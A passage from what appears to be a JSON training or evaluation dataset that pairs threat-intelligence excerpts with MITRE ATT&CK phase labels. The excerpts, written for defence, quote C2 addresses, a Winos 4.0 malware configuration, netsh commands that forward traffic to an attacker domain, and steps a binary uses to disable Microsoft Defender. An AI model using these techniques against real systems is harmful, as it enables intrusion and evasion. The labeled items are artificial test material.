        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Bazar:\n34.210.71[.]206\nWe observed the Bazar malware inject into a WerFault process to perform ongoing command and control communication.\nAnchor:\nThe AnchorDNS malware performed C2 over DNS to the following domains:\nCobalt Strike:\n195.123.217[.]45\nCobalt Strike Config:\n~tmp01925d3f.exe can be seen communicating with the Cobalt Strike C2 channel.",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Although the number of exposed servers is relatively small, Unit 42 recommends organizations using MOVEit Transfer follow Progress Software's mitigation guidance immediately. There are already reports of CVE-2023-34362 being exploited in the wild and there will likely be reports of more organizations who are affected in the near future.\nThe additional disclosures ofCVE-2023-35036 and CVE-2023-35708 should also be monitored by organizations.\nUnit 42 continues to track the vulnerabilities in MOVEit Transfer and will update this brief as more information becomes available.\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In many of the observed DEV-0270 instances, the actor gained access by exploiting known vulnerabilities in Exchange or Fortinet (CVE-2018-13379). For Exchange, the most prevalent exploit has been ProxyLogon-this highlights the need to patch high-severity vulnerabilities in internet-facing devices, as the group has continued to successfully exploit these vulnerabilities even recently, well after updates supplied the fixes. While there have been indications that DEV-0270 attempted to exploit Log4j 2 vulnerabilities, Microsoft has not observed this activity used against customers to deploy ransomware. ",
        "output": "initial access",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The discovery phase primarily utilized built-in Windows tools. One utility seen waschcpwhich allows you to display or set the code page number. The defaultchcpvalue is determined by the Windows locale. The locale can indicate the language, country, and regional standards of that host (e.g. date and time formatting). After viewing the default page code, the adversary did change the value to 65001 to reflect the UTF-8 character set. We have seen this as a technique employed by IcedID for some time as reported in depth inprior cases.\nFollowing the initial discovery commands mentioned above on day one, the threat actor scanned the network for port 1433, the default port used by Microsoft SQL server.\nThe discovery phase remained minimal leading into day six. The threat actors were seen dropping AdFind and adget.exe to reveal all users, groups, computers, organizational units, subnets, and trust objects within the domain.\nAdget is a newer tool that we first observed in thisprevious reportbut generally this tool performs similar AD discovery as AdFind.\nFollowing the Active Directory discovery activity, additional remote discovery actions were observed using WMI to gather information about Windows OS version and licensing on the hosts.\nThen another recon round occurred using NSLOOKUP to map assets to IP addresses.\nThis was followed by network scans for RDP:",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Beginning on Oct. 24 at 08:00 UTC, FireEye detected and blocked attempts to infect multiple clients with a drive-by download masquerading as a Flash Update (install_flash_player.exe) that delivered a wormable variant of ransomware. Users were redirected to the infected site from multiple legitimate sites (e.g. \nhttp://www.mediaport[.]ua/sites/default/files/pagemain.js) simultaneously, indicating a coordinated and widespread strategic web compromise campaign. \nFireEye network devices blocked infection attempts at over a dozen victims primarily in Germany, Japan, and the U.S. until Oct. 24 at 15:00 UTC, when the infection attempts ceased and attacker infrastructure \u2013 both 1dnscontrol[.]com and the legitimate websites containing the rogue code \u2013 were taken offline. ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: As we have observed in other malware, Ursnif ran a number of automated discovery commands to gain information about the environment. The following commands were executed and their standard output was redirected to append to a file in the user's %APPDATA%\\Local\\Temp\\\nOnce the threat actor had Cobalt Strike running on the beachhead host, they ran the following commands:\nThe threat actor quickly took interest in a support account. This account belonged to the Domain Admin group.\nThe threat actor also used a batch script to collect a list of all computer objects on the domain usingC:\\Windows\\system32\\cmd.exe /C adcomp.batwhich contained the PowerShell command:\nDuring the final actions taken by the threat actors before eviction, after completing RDP connections to various hosts on the network, the threat actors checked running processes on the accessed hosts via taskmanager, which were started via their interactive RDP session as noted by the/4command line argument.",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Prior to launching the final stage of the attack, the threat actors gained administrative access to a deployed endpoint detection and response (EDR) solution to make modifications, removing libraries that affected the agents across the enterprise. In addition, a binary to disable components of Microsoft Defender Antivirus was propagated using custom tooling. The distributed binary named disable-defender.exe queries for TokenElevation using the GetTokenInformation API and checks if the process is running with elevated privileges. If the token is not running with elevated privilege, the binary prints \"Must run as admin!\\n\". If the token is elevated, it queries TokenUser and checks if the SID is $^{\\prime\\prime}\\mathsf{S}{-}\\mathsf{1}{-}\\mathsf{5}{-}\\mathsf{1}\\mathsf{8}^{\\prime\\prime}$ . If the current process doesn't run under system context, it prints \"Restarting with privileges\\n\" and attempts to elevate the privilege. \nTo elevate the privilege, the binary checks if the TrustedInstaller service is enabled. To do this, it starts the service \"SeDebugPrivilege\" and \"SeImpersonatePrivilege\" to assign privileges to itself. It then looks for winlogon.exe process, acquires its token, and impersonates calling thread using ImpersonateLoggedOnUser/SetThreadToken. After impersonating as winlogon.exe, it opens TrustedInstaller process, acquires its token for impersonation and creates a new process with elevated privileges using CreateProcessWithTokenW. \nOnce it successfully creates its own process with TrustedInstaller privilege, it proceeds to disable Defender components. \nTerminates smartscreen.exe   \nModifies WinDefend service to DemandLoad.   \nModifies \"TamperProtection\" value to 0   \nQueries WMI \"Root\\Microsoft\\Windows\\Defender\" Namespace \"MSFT_MpPreference\" class for \"DisableRealtimeMonitoring\"   \nSets \"DisableAntiSpyware\" value to 1   \nSets \"SecurityHealth\" value to 3   \nSets \"DisableAntiSpyware\" value to 0   \nSets \"SYSTEM\\CurrentControlSet\\Services\\WinDefend\" service \"Start\" value to 3   \nSets \"DisableRealtimeMonitoring\" value to 1   \nModifies further settings using WMI \"Root\\Microsoft\\Windows\\Defender\" Namespace \"MSFT_MpPreference\" class values, \"EnableControlledFolderAccess\" \"PUAProtection\" \"DisableRealtimeMonitoring\" \"DisableBehaviorMonitoring\" \"DisableBlockAtFirstSeen\" \"DisablePrivacyMode\" \"SignatureDisableUpdateOnStartupWithoutEngine\" \"DisableArchiveScanning\" \"DisableIntrusionPreventionSystem\" \"DisableScriptScanning\" \"DisableAntiSpyware\" \"DisableAntiVirus\" \"SubmitSamplesConsent\" \"MAPSReporting\" \"HighThreatDefaultAction\" \"ModerateThreatDefaultAction\" \"LowThreatDefaultAction\" \"SevereThreatDefaultAction\" \"ScanScheduleDay\" \nAdditional evasion techniques included the deletion of tooling, Windows events, and application logs. ",
        "output": "defense evasion",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Unit 42 researchers discovered a campaign distributing thousands of fraudulent cryptocurrency investment platforms \u200b\u200bvia websites and mobile applications. This article describes how threat actors systematically create, promote and potentially profit from these scams, highlighting the techniques used to deceive victims and the potential scale of the operation.\nThe campaign impersonates well-known brands, cryptocurrency platforms and popular organizations to lure victims. The consistent design of the websites and mobile apps suggests the use of a standardized toolkit for developing these platforms at scale.\nThere are several additional indicators attributing these activities to a single threat actor. This is underscored by the consistent registration of domains primarily in Singapore, predominantly using registrars with lenient policies and repeated patterns of fake registrant names. These domains also employ free HTTPS certificates and domain fronting via a popular public cloud service to obscure their true locations.\nThis campaign primarily targets users in East African and Asian countries, with scammers hosting large Telegram channels and groups to engage with victims. The scammers lure users with promises of unrealistically high investment returns and operate similar to Ponzi schemes by encouraging users to recruit others through multi-level affiliate programs.\nPalo Alto Networks customers are better protected from the threats discussed in this article through ourNext-Generation Firewall'sAdvanced WildFire,Advanced URL FilteringandAdvanced DNS Securitysubscriptions.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: KRBanker usesProcess Hollowingto execute its main code in a clean (non-suspicious) executable. The process is as follows:\nKRBanker executes a clean PE file in System directory. \nWindows loads the PE file into memory. \nKRBanker overwrites the whole clean process with its own (malicious) main module. \nOverwritten process starts malicious activity.\nFigure 5 Execution Steps\nFigure 6 Execution Steps (cont.)\nAfter a successful execution the Windows Firewall alerts the user on the process attempting to access the Internet. Many users may allow this activity because the process originally involved a clean Microsoft file.\nFigure 7 Windows Firewall Alert",
        "output": "execution",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Network-based protectionSymantec has the following IPS protection in place to block attempts to exploit the MS17-010 vulnerability:\nOS Attack: Microsoft SMB MS17-010 Disclosure Attempt(released May 2, 2017)\nAttack: Shellcode Download Activity(released April 24, 2017)\nSONAR behavior detection technology\nSONAR.AM.E.!g18\nSONAR.AM.E!g11\nSONAR.Cryptlk!g1\nSONAR.Cryptlocker!g59\nSONAR.Cryptlocker!g60\nSONAR.Cryptlocker!g80\nSONAR.Heuristic.159\nSONAR.Heur.Dropper\nSONAR.Heur.RGC!g151\nSONAR.Heur.RGC.CM!g13\nSONAR.Heuristic.158\nSONAR.Heuristic.161\nSONAR.SuspDataRun\nSONAR.SuspLaunch!g11\nSONAR.SuspLaunch!gen4\nSONAR.TCP!gen1\nAdvanced Machine Learning\nHeur.AdvML.A\nHeur.AdvML.B\nHeur.AdvML.D\nAntivirus\nFor expanded protection and identification purposes, the following Antivirus signatures have been updated:\nRansom.Wannacry\nRansom.CryptXXX\nTrojan.Gen.8!Cloud\nTrojan.Gen.2\nRansom.Wannacry!gen1\nRansom.Wannacry!gen2\nRansom.Wannacry!gen3\nCustomers should run LiveUpdate and verify that they have the following definition versions or later installed in order to ensure they have the most up-to-date protection:\n20170512.009\nThe following IPS signature also blocks activity related to Ransom.Wannacry:\nSystem Infected: Ransom.Ransom32 Activity\nOrganizations should also ensure that they have the latest Windows security updates installed, in particularMS17-010to prevent spreading.",
        "output": "other",
        "source": "Symentec"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Based on the available campaign information, the attacker doesn't align with any financially motivated threat groups currently tracked by FireEye. The attacker's understanding of the Click2Gov host requirements, process logging details, payment card fields, and internal communications protocols demonstrates an advanced knowledge of the Click2Gov application. Given the manner in which underground forums and marketplaces function, it is possible that tool development could have been contracted to third parties and remote access to compromised systems could have been achieved by one entity and sold to another. There is much left to be uncovered about this attacker. \nWhile it is also possible the attack was conducted by a single individual, FireEye assesses, with moderate confidence, that a team was likely involved in this campaign based on the following requisite skillsets: \nAbility to locate Click2Gov installations and identify exploitable vulnerabilities. Ability to craft or reuse an exploit to penetrate the target organization's network environment. Basic JSP programming skills. \nAdvanced knowledge of Click2Gov payment processes and software sufficient to develop moderately sophisticated malware. Proficient $\\mathsf{C}/\\mathsf{C}++$ programming skills. General awareness of operational security. Ability to monetize stolen payment card information. ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We observed multiple initial access vectors that the Void Arachne threat actor group uses to distribute malware across the web and through social media platforms. These distribution methods include an infrastructure staged for SEO poisoning and malicious package distribution across Chinese-language-themed Telegram channels.\nFor this campaign, Void Arachne set up a web infrastructure that is used for SEO poisoning that deployed spear-phishing links (T1566.002) disguised as legitimate software installers to lure potential victims. These links are hosted on web servers disguised as legitimate websites so that the Void Arachne threat group can proceed to make them rank high on search engines via SEO poisoning.\nThese links contain MSI installers for common software targeting Chinese-speaking users such as Google Chrome, Chinese language packs for popular software, and VPNs such as LetsVPN and \u5feb\u9023VPN (also known as Quick VPN or  Kuilian VPN). When these malicious MSI files or archive files are downloaded and executed, they would bootstrap the infection process. To the victim, it appears as if the intended software was installed. However, unbeknownst to them, additional malware is installed that beacons back to the attacker's C&C server.\nBecause MSI files are bundled software installers, threat actors can include backdoors and additional malware within the file bundle that are executed without the end user's knowledge during the installation process.\nIn this campaign, the Void Arachne group created subdomains of the domainwebcamcn[.]xyzto act as C&C servers for the various  MSI files. As the campaign progressed, various subdomains were added to this root domain.\nInternet connectivity in the People's Republic of China is subject to strict regulation through a combination of legislative measures and technological controls collectively known as theGreat Firewall of China. Due to strict government control, VPN services and public interest in this technology have notably increased. This has, in turn, enhanced threat actors' interest in exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.\nWe discovered that the VPN \"\u5feb\u9023VPN\" is a common phishing and SEO poisoning vector used to target Chinese-speakers and the broader East Asian community.  We have evidence of multiple distinct Chinese-speaking threat actors creating spear-phishing links and using SEO poisoning tactics by bundling this VPN with malware that includes Gh0st RAT and its variants.\nWe observed several Telegram channels, some of which had tens of thousands of Chinese-speaking users, advertising malicious archives and MSI files as an additional distribution method. The malicious packages are in what appear to be Simplified Chinese language packs for Telegram as well as various AI tools.\nLike what's being promoted in Void Arachne's SEO poisoning campaign, we also observed the same malicious MSI files being shared in Chinese language-centric Telegram Channels. These channels are all related to VPN technology and the malicious MSI files were shared across several Telegram channels.\nThis is like other campaigns we've observed wherein after threat actors conduct SEO-poisoning tactics, they then share links to these malicious sites or upload related files on social media and messaging applications.\nA common malicious software package we observed is what appears to be a Telegram language pack for the Simplified Chinese language. (Telegram does offer a translation of its app in Simple Chinese, which may be foundhere.)\nUsing infected language packs as an infection vector is an interesting method, especially for the Chinese language, which has an estimated 1.3 billion native speakers. Some applications require language packs for a more localized user experience in regional markets, leaving these users potentially vulnerable to this kind of attack.\nA concerning trend we have recently observed is the mass proliferation of nudifier applications that abuse AI to create  AI-generated nonconsensualdeepfakepornography. These images and videos are often used insextortionschemes for further abuse, victim harassment, and financial gain.\nFigure 6 shows a screenshot of a video on the Void Arachne Telegram channel where a photo of a woman was used to generate a deepfake pornographic video of using AI technology.\nWe've observed that the threat actors pinned the malicious MSI file to the top of their Telegram channels to increase the chances of infecting users who are interested in using this type of technology.\nThe malicious installer files are advertised on social media and Telegram channels and are intended to lure unsuspecting victims, potentially even minors. Based on an initial Simplified Chinese to English translation of their advertisement via Google Translate, the malicious actors are also targeting young individuals who are still in school with their use of the phrase \"female classmate.\"\nJust have appropriate entertainment and satisfy your own lustful desires. Do not send it to the other party or harass the other party. Once you call the police, you will be in constant trouble! AI takes off clothes, you give me photos and I will make pictures for you. Do you want to see the female classmate you yearn for, the female colleague you have a crush on, the relatives and friends you eat and live with at home? Do you want to see them naked? Now you can realize your dream, you can see them naked and lustful for a pack of cigarette money.\nA Simplified Chinese to English translation of an advertisement that promotes nudifiers or deepfake pornography-generating software on the threat actor's Telegram channel\nVoid Arachne also advertised AI technologies that could be used forvirtual kidnapping, which is a novel deception campaign that uses misinformation through AI voice-alternating technology to pressure victims into paying ransom.\nIn addition to fake nudifier applications, we saw additional channels advertising face-swapping and voice-changing software. Like the rise of nudifiers and deepfake-generating applications, we have also observed the rise of AI-powered apps that have face-swapping and voice-altering capabilities.\nWe've found that malicious MSI files were shared and pinned on various AI video and voice manipulation Telegram channels.\nFigure 10 shows a screen capture of a threat actor video posted on Void Arachne's Telegram channel wherein the malicious actor can be seen using AI face- and voice-cloning technology on a WhatsApp call. Figure 12, on the other hand, shows a malicious voice-altering and face-swapping AI app installer on Telegram.\nThis section discusses our analysis of the malicious files associated with Void Arachne's campaign, starting with theletvpn.msifile.\nThe malicious MSI file uses Dynamic Link Libraries (DLLs) during the installation process. These DLLs play a pivotal role during runtime, facilitating various essential operations including property management within MSI packages, scheduling tasks, and configuring firewall rules.\nThe MSI file performs several tasks, such as creating scheduled tasks and configuring firewall parameters. Specifically, we have observed the creation and configuration of firewall rules via theOnFwConfigandOnFwInstallfunctions fromNetFirewall.dll,which are designed to whitelist both inbound and outbound traffic associated with the malware for the public network profile only.\nFigure 16 shows the configuration of the inbound firewall rule created to enable unrestricted access for the malware when connected to public networks, ensuring that the malware can operate without interruption.\nFurthermore,letvpn.msidrops multiple hidden files, including theLetsPro.exeloader, within the designated directory pathC:\\Program Files (x86)\\Common Files\\Microsoft Shared\\.Subsequently, it initiates the execution of the LetsPRO loader.\nTable 1. Sample of files dropped byLetsPro.msi\nLetsPro.exeis a trojan loader that decrypts, maps, and executes a second-stage payload in memory.  The loader first reads and loads the content of a file named \"1\", with the following content structure:\nstruct payload_struct {uint32_t flag;      // 1 if the data is encrypted, 0 if it's plaintext/Memory clean upuint32_t fileSize;  // Size of the encrypted data in byteschar encryptedData[]; // The encrypted payload};\nIt then identifies the encrypted data section within the file. The initial part of the file structure contains a flag set to 1, which indicates encryption. The loader uses the Rivest Cipher 4 (RC4) algorithm with the key \"0x678E0B00\" to decrypt this data. After decryption, the payload, which is now executable code, is mapped into the process's memory space and executed.\nThe decryption key structure is defined as follows:\nstruct decryption_key_struct {uint32_t memory_cleanup; // Flag for memory cleanup after decryptionuint32_t keySize;        // Size of the decryption keychar key[];              // Decryption key};\nThe following code snippet demonstrates the core part of the loader logic:\nThe following snippet demonstrates the decrypted file 1 structure in memory:\nAfter the second-stage loader (file \"1\") is executed and loaded into memory, the malware drops a Visual Basic Script (VBScript) designed to automate the creation of a scheduled task within Windows Task Scheduler to achieve persistence. The VBScript file will create a new scheduled task and configure task settings to run when a user is logged on to execute a specified batch file. Additionally, the malware creates a Windows service that starts withCreateSvc_to execute the VBScript file. At the time of research, the batch file was not available.\nAfter that, the malware replicates the loader, VBScript, and the file \"1\" within the user directory.\nTable 2. Sample of files dropped by1\nThe malware also uses thenetshcommand to set up port forwarding and configure firewall rules named \"Safe<integer>\" on the victim's machine, thereby whitelisting inbound and outbound traffic related to the malware for all network profiles.\nIt establishes a rule for IPv4-to-IPv4 port forwarding. Specifically, it designates port 443 as the listening port on the local machine, where incoming connections will be received. It specifies a destination address (103.214.147.14[.]webcamcn[.]xyz), indicating where the forwarded traffic will be directed. Additionally, it designates port 443 on the destination server as the port to which the incoming traffic will be forwarded. This configuration redirects traffic from the local machine's port 443 to the specified destination address and port.\nnetsh interface portproxy add v4tov4 listenport=443 connectaddress=103[.]214[.]147[.]14[.]webcamcn[.]xyz connectport=443\nnetsh advfirewall firewall add rule name=\"Safe1\" dir=in action=allow program=\" C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX\\app-3.4.0\\LetsPRO.exe\"\nFinally, the malware passes the execution to the Winos 4.0 stager in memory.\nThe final payload of this attack is the Winos 4.0 implant, which is written in C++ and targets the Windows platform. Winos has features that include file management,distributed denial of service (DDoS)using TCP/UDP/ ICMP/HTTP, full disk search, webcam control, and screen capturing. Additionally, it supports many functionalities including process injection and microphone recording, system and service management, remote shell access, and keylogging functionalities, further enhancing its ability to control and monitor the infected system.\nThe Winos C&C server is equipped with 23 internal plugins, each compiled in both 32- and 64-bit versions, to execute a variety of tasks. Table 3 shows the complete list of these plugins, along with their respective SHA256 hashes:\nTable 3. Winos 4.0 internal plugins\nSimilar toCobalt Strikeand Sliver, Winos supports custom plugins that can be developed by a threat actor. This allows the tool to extend its capabilities and add custom functionality. During our investigation, we found the following external and custom plugins for Winos 4.0 in the wild:\nTable 4. Winos 4.0 external plugins\nThe second stage loader discussed earlier executes the Winos stager payload,\u4e0a\u7ebf\u6a21\u5757.dll/exe(which translates toOnline Module.dll/exe). This module can be generated in both EXE and DLL formats. In this campaign, the attacker delivers a DLL implant. This module is responsible for downloading and executing the main implant,\u767b\u5f55\u6a21\u5757.dll(which translates toLoginModule.dll), on an infected system.\nUpon execution, the stager reads and initializes its configuration. Notably, the configuration is in cleartext but is arranged in reverse order. The following is the fixed configuration setup:\n|p1:127.0.0.1|o1:443|t1:1|p2:103[.]214[.]147[.]14[.]webcamcn[.]xyz|o2:80|t2:1|p3:103[.]214[.]147[.]14[.]webcamcn[.]xyz|o3:80|t3:0|dd:1|cl:1|fz:\u9ed8\u8ba4|bb:1.0|bz:2024. 4.18|jp:0|bh:0|ll:0|dl:0|sh:0|kl:0|bd:0|\nTable 5 contains the stager's configuration values and their descriptions.\nTable 5. Winos 4.0 stager configuration values and descriptions\nTo communicate with its C&C server, the malware first needs to generate an encryption key to secure the communication. To generate this key, the malware calls thetimeGetTime()Windows API function, which returns the system time in milliseconds, and appends \"00 00 00 00 ca 00\" to it. The data that needs to be transferred is then encrypted with this key and appended after the key.\nFigure 28 is an example of an initial handshake between the stager and the C&C server. The malware encrypts and sends the hardcoded value \"04 00\" to its C&C server to indicate that this initial packet contains the key. The server then uses this session key for future communications.\nThe encryption algorithm begins by preparing a block of data and a key, adjusting the buffer to ensure that there is sufficient space to work with both. The key is then appended to the beginning of the data that needs to be encrypted. The algorithm proceeds with the encryption process, which involves a loop that processes each byte of data. For each byte, a specific byte from the key is selected and transformed by taking its modulus with a hardcoded value (0x1C8) and then adding another hardcoded value (0x36) to it. This transformed key is then used to XOR with the current byte of the data, resulting in the encrypted byte that replaces the original byte in the data. Every ten bytes, the algorithm resets the pointer to the beginning of the key, ensuring that the key is reused cyclically.\nIt should be noted that, based on our analysis, the value 0x1C8 remained the same in all the samples used in this campaign and several other attacks. However, we have observed that some variants found in the wild use different values, such as 0x7C5, indicating that this value might change from sample to sample. However, the value 0x36 remained the same in all the variants we analyzed.\nNext, the C&C server responds with a magic value of \"04\" and a unique 16-byte identifier in UTF-16 format. In some Winos variants, this identifier is the MD5 hash of the DLL module that will be downloaded. Figure 30 is an example of the C&C server response to network traffic.\nFigure 31 shows a decrypted packet data section.\nThe stager then sends the next-stage payload plugin, named\u767b\u5f55\u6a21\u5757.dll(LoginModule.dll), to the C&C server.\nFigure 33 shows the decrypted packet data section.\nThe C&C server response contains the following information:\nModule name \nModule hash \nBinary loader shellcode \nDLL module binary file\nThe stager then saves the decrypted C&C server response (the plugin and its configuration) into the Windows Registry. It uses the name \"d33f351a4aeea5e608853d1a56661059\" and stores it under the key pathHKEY_CURRENT_USER\\Console\\0for 32-bit plugins orHKEY_CURRENT_USER\\Console\\1for 64-bit plugins.\nFinally, to execute the module, the stager locates the shellcode section within the response received from the C&C server at offset 0xA44 and transfers control to the shellcode.\nThe\u767b\u5f55\u6a21\u5757.dll(LoginModule.dll) is a fundamental component of Winos 4.0, serving as the core plugin manager for the system. This module is responsible for handling every action and command executed by the operator, which are transmitted via the C&C server as DLL plugins. These plugins extend the functionality of the implant.\nUpon receiving the response from the C&C server, the implant stores these DLL plugins in the Windows registry pathsHKEY_CURRENT_USER\\Console\\0for 32-bit systems orHKEY_CURRENT_USER\\Console\\1for 64-bit systems. Subsequently, the implant loads and uses these plugins to perform various tasks, enhancing its operational capabilities. This modular approach allows for a highly flexible and extensible framework, enabling the efficient execution of diverse functions as required by the operator.\nOnce the\u767b\u5f55\u6a21\u5757.dll(LoginModule.dll) plugin is downloaded, the execution of this module is based on the previously mentioned configuration. The malware creates a thread to collect clipboard data and keystrokes. It also employs a specific mutex for this thread, which is named \u6d4b\u8bd5\u5907\u6ce8  (Test Notes).\nNext, the malware chooses one of the three available C&C configurations. Before initiating the socket, it checks whether the antianalysis feature is configured to run. If this feature is configured, the malware verifies the presence of monitoring software by inspecting the window titles of running processes. If such software is detected, the malware enters sleep mode.\nBelow is a list of monitoring software that the malware detects:\n\u6d41\u91cf(Flow) \nTaskExplorer \nWireshark \nFiddler \nProcess \nApateDNS \nCurrPorts \n\u4efb\u52a1\u7ba1\u7406\u5668(Task manager) \n\u706b\u7ed2(Tinder) \n\u63d0\u793a\u7b26(Prompt) \nMalwarebytes \nPort \n\u8d44\u6e90\u76d1\u89c6\u5668(Resource monitor) \nCapsa \nTCPEye \nMetascan \n\u7f51\u7edc\u5206\u6790(Network analysis) \nSniff\nThe malware collects system information from an infected machine, including the IP address, computer name, antivirus software, operating system details, and hardware ID (HWID).\nTable 6 shows a list of targeted antivirus (AV) software.\nTable 6. List of targeted antivirus software\nNext, the malware employs the encryption algorithm that we've previously discussed to encrypt all collected data. Using thetimeGetTime()Windows API function, a new key will be generated to encrypt the collected data, which is different from the key used during the stager's initial request. The malware appends the hardcoded value \"06 00\" to the encryption key to indicate that this request contains collected data. Unlike the stager,LoginModule.dlldoesn't send the key in a separate request, instead, it prefixes the value of the key to the collected data and sends this encrypted request to the C&C server.\nFigure 40 shows the initial packet that the malware sends.\nThe malware then begins to listen for incoming commands from the C&C server. It can execute a variety of tasks, including loading additional plugins, capturing screenshots, and clearing system logs. These functions are managed and executed through controlled switch statements, ensuring precise and efficient handling of each instruction.\nTable 7 lists the malware's supported functionalities.\nTable 7. A list of the malware's supported functionalities\nIn the scope of our research, we conducted an analysis of a Void Arachne campaign that targets the Chinese-speaking demographic. Using SEO poisoning and widely used messaging applications such as Telegram, the Void Arachne threat group has potentially reached a substantial Chinese-speaking demographic as well as the broader East Asian community through the dissemination of malicious MSI files.\nAs is the case with Void Arachne's campaign, threat actors abused the great public interest in AI technologies to deliver malware. Our investigation revealed that Void Arachne promoted compromised MSI files embedded with nudifiers and deepfake pornography-generating software, intending to infect unsuspecting users. Furthermore, the group advertised corrupted AI voice and facial technologies, frequently exploited invirtual kidnappingschemes. The proliferation of these artificial technologies has prompted concerns regarding potential misuse, particularly evident insextortionandvirtual kidnappingschemes that can lead toheartbreaking consequences. In its commitment to safeguarding the general public's online well-being, Trend Micro has curated comprehensive resources designed to educate the community onidentifying, preventing, and addressing sextortion attacks. In the event of falling victim to sextortion or virtual kidnapping, the prompt reporting of the incident to relevant authorities, such as theInternet Crime Complaint Center (IC3), is strongly recommended.\nThroughout 2024, we have seen an increase in malicious MSI files, such as in aDarkGatecampaign that exploited the Microsoft Windows Internet Shortcut SmartScreen Bypass Vulnerability (CVE-2024-21412). Individuals are strongly advised to check the source of MSI files and only download them from trusted sources. As previously discussed, MSI files are bundled installers, which mean that malicious software as well as zero-day exploits can be bundled alongside legitimate software. These malicious MSI files pose a significant threat to organizations as they may act as a backdoored installer and poison the software installer supply chain.\nOrganizations can protect themselves from these kinds of attacks withTrend Vision One, which enables security teams to continuously identify attack surfaces, including known, unknown, managed, and unmanaged cyber assets. Vision One helps organizations prioritize and address potential risks, including vulnerabilities. It considers critical factors, such as the likelihood and impact of potential attacks, and offers a range of prevention, detection, and response capabilities. This is all backed by advanced threat research, threat intelligence, and AI, which helps reduce the time taken to detect, respond, and remediate issues. Ultimately, Trend Vision One can help improve the overall security posture and effectiveness of an organization, including defending an organization against zero-day attacks.\nWhen faced with uncertain intrusions, behaviors, and routines, organizations should assume that their system is already compromised or breached and work to immediately isolate affected data or toolchains. With a broader perspective and rapid response, organizations can address breaches and protect their remaining systems, especially with technologies such asTrend Micro\u2122 Endpoint Security\u2122 and Trend Micro Network Security, as well as comprehensive security solutions such asTrend Micro\u2122 XDR, which can detect, scan, and block malicious content across the modern threat landscape.\nThe complete list of indicators of compromise (IoCs) can be foundhere.",
        "output": "initial access",
        "source": "Trendmicro"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Initial access took the form of an LNK file delivered to a victim through a MalSpam campaign.\nThe Powershell script embedded within the LNK is a Base64 encoded script with various components split into different variables for obfuscation purposes. The script will decode itself rather than depend on Powershell's built-in ability to execute encoded scripts.\nThe Powershell script, when double clicked (executed), will attempt to connect to a set of domains containing the Emotet malware. Upon successful download of the Emotet malware, the PowerShell script will write it to a temporary directory and execute the payload viaregsvr32.exe.\nIt is interesting to note, the LNK identifies the machine it was created on through the NetBIOS name ofblack-dogand a MAC Address beginning with08:00:27indicating asystem running on Virtualbox.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The use of the Cobalt Strike 'getsystem' command was evident, with cmd being spawned from the beacon (DLLHOST) to elevate to a 'SYSTEM' context.\nDetails of the technique are documented here:https://www.cobaltstrike.com/blog/what-happens-when-i-type-getsystem\nThroughout the intrusion, new logon sessions were initiated using tokens created from harvested credentials. Initially, a sacrificial process, dllhost.exe, was launched from the PowerShell payload using the credentials of the compromised beachhead account.\nUsing a harvested credential, a new logon session was created. This was logged under Windows eventID 4624, showing the initial Logon ID, and followed the new Logon ID using the target user account.\nThe newly created logon session (Logon ID) was assigned special privileges (elevated) as detailed in eventID 4672.\nResulting in the CMD with the new logon session with elevated privileges\nThe threat actor targeted several accounts using the same technique, these were:\nThe threat actor pivoted across compromised accounts and across several endpoints with relative ease.\nMultiple detection opportunities exist, including correlating atypical logons to high-privilege accounts from unexpected accounts or workstations, and the assignment of special privileges to a logon ID by standard users. The use of 'Logon type 9' alongside an authentication type of 'seclogo' strongly indicates credential use, akin to the 'runas' command's /netonly method, as used by Cobalt Strike's 'pass the hash' 